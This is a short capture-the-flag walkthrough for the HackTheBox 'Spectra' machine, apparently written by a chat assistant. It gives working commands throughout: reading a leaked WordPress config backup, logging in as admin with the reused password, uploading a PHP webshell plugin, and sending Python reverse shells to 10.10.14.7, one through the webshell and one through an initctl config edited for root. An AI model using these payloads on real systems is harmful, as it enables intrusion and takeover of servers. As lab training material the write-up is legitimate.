## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)

---

## 🔍 Recon
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.229
nmap -p 22,80,3306 -sCV -oA scans/nmap-tcpscripts 10.10.10.229
```

---

## 🤖 Hosts Setup
```bash
echo "10.10.10.229 spectra.htb" | sudo tee -a /etc/hosts
```

---

## 🔗 Enumerate [WordPress](HTTP)
```bash
# Look for .save file
curl http://spectra.htb/testing/wp-config.php.save

# Credentials found:
DB_USER=devtest
DB_PASS=devteam01

# Try login
wpscan --url http://spectra.htb/main -e ap,t,tt,u --api-token <your-token>
```

---

## 👤 WP Admin Login
```bash
# Username: administrator
# Password: devteam01
```

---

## 📂 Webshell via Plugin (Option A)
```php
# Create 0xdf.php with:
<?php system($_REQUEST["0xdf"]); ?>

# Zip it:
zip 0xdf-plug.zip 0xdf.php

# Upload via WP Admin ➝ Plugins ➝ Upload Plugin

# Access shell:
curl http://spectra.htb/main/wp-content/plugins/0xdf-plug/0xdf.php?0xdf=id
```

---

## 🚧 Reverse Shell (from WP Webshell)
```bash
# Listener
nc -lnvp 443

# Payload
curl http://spectra.htb/main/wp-content/plugins/0xdf-plug/0xdf.php \
  --data-urlencode "0xdf=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.7\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

---

## 🔎 Lateral Movement (Find creds)
```bash
cat /etc/lsb-release
cat /etc/autologin/passwd  # => SummerHereWeCome!!
```

---

## 🔐 [SSH](SSH) as Katie
```bash
sshpass -p 'SummerHereWeCome!!' ssh katie@10.10.10.229
```

---

## 🔒 Root Escalation
```bash
# Sudo permissions
sudo -l
# ➝ /sbin/initctl

# Editable conf:
ls /etc/init/*.conf  # choose test.conf or make your own

# Add to script block:
exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Start service:
sudo initctl start test
```

---

## ✅ Root Access
```bash
cat /root/root.txt
```

---

## 📑 Resources
- https://book.hacktricks.xyz/pentesting/wordpress
- https://gtfobins.github.io/gtfobins/initctl/
- https://github.com/offensive-security/exploitdb-bin-sploits/blob/master/bin-sploits/44449.rb

Let me know if you want a visual breakdown or plugin-based method only ✨

